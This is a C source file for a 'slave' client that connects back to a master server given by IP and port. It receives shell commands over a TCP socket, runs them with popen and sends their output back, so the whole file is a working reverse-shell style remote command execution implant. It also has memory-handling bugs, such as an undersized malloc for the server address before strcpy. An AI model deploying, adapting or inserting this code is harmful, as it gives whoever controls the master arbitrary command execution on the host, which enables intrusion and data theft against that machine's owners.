#include <slave.h>

FILE* p_file;
int read_output; // read output from command pipe

int main(int argc, char** argv){
	if (argc<3){
		fprintf(stdout, "Usage : %s server_ip server_port\n", argv[0]);
		fprintf(stdout, "Slave that connect to the server_ip:server_port\n");
		return -1;
	}

	int server_port = atoi(argv[2]);
	char* server_ip = (char*)malloc(sizeof(argv[1]));
	strcpy(server_ip, argv[1]);



	// create socket 
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1){
		perror("[-] Error while creating socket");
		return -1;
	}
	fprintf(stdout, "[+] Socket created successfully\n");

	fprintf(stdout, "[+] Connecting to %s:%d...\n", server_ip, server_port);


	struct sockaddr_in server_address;
	memset(&server_address, 0, sizeof(server_address));
	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(server_port); // port number
	server_address.sin_addr.s_addr = inet_addr(server_ip); // set address to 0.0.0.0 or inet_addr("0.0.0.0")


	int conn_res = connect(sock, (struct sockaddr *)&server_address, sizeof(server_address));
	if (conn_res == -1){
		perror("[-] Error while connecting to master");
		return -1;
	}
	fprintf(stdout, "[+] Connected to master successfully\n");

	
	char command[BUFFER_SIZE], output[BUFFER_SIZE], *line;
	int loose_attempt = 0;
	ssize_t sent, received;
	while(1){
		// set command string to empty string
		memset(command,0,sizeof(command));
		fprintf(stdout, "[+] Waiting for command...\n");
		received = recv(sock, (void*)(&command), sizeof(command), 0);
		if (received == -1){
			perror("Error occured while receiving");
			return -1;
		}
		if (received == 0){
			fprintf(stderr, "[-] Possible master connection loose. Ignoring %d...\n", loose_attempt);
			loose_attempt++;
			if (loose_attempt >= MAX_ATTEMPT){
				fprintf(stderr, "[-] Max attempt reached. Abording due to 0 byte received.\n");
				break;
			}
			continue;
		}
		if (received >= BUFFER_SIZE){
			fprintf(stderr, "[-] Buffer overflow...\n");
			continue;
		}
		fprintf(stdout, "[+] Received command : %s\n", command);
		p_file = popen(command, "r"); // = fork + pipe + exec
		if (p_file == NULL){
			perror("Error while opening pipe to exec command");
			return -1;
		}
		read_output = 0;
		// empty the output buffer
		memset(output,0,sizeof(output));
		// ** read line by line. Faster but do not format exactly the same
		// while ( (line = fgets(output, sizeof(output), p_file)) != NULL){
		// 	strcat(output, line);
		// }
		// 
		// ** read character by character. Slower but exact output format
		char car;
		int i = 0;
		while ( (i < BUFFER_SIZE-1) && (car = fgetc(p_file)) != EOF ){
			output[i++] = car;
		}
		output[i] = '\0';
		if (strlen(output) == 0){
			// nothing to send so mistake in the command
			strcpy(output, "Mistake in the command. Check command syntax again");
		}

		// send output to master
		sent = send(sock, (void*)output, strlen(output), 0);
		if (sent == -1){
			perror("Error occured while sending");
			continue;
		}
		fprintf(stdout, "[+] Output of %d bytes sent to master\n", sent);
	}


	// close the file descriptor
	int res = close(sock);
	if (res != 0){
		perror("Error while closing the socket file descriptor");
		return -1;
	}
	fprintf(stdout, "[+] Socket closed successfully\n");
	return 0;
}